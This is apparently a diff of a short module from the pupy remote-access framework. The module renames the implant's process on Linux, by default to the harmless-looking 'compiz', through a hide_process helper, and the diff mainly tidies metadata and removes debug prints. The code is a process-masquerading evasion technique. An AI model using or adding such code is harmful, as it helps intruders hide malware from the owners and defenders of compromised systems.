@@ -1,21 +1,18 @@
 # -*- coding: utf-8 -*-
 
-""" change pupy process's name """
+""" Change pupy process's name """
 
-dependencies = {
+__dependencies__ = {
     'linux': ['hide_process']
 }
 
-arguments = {
-    'name': 'ex: compiz'
+__arguments__ = {
+    'name': 'Process name'
 }
 
+__compatibility__ = ('linux')
 
-import sys
+import hide_process
 
 def main(name='compiz'):
-    print "HIDE ARGV!!!"
-    print "NAME:", name
-    if sys.platform == 'linux2':
-        import hide_process
-        hide_process.change_argv(argv=name)
+    hide_process.change_argv(argv=name)
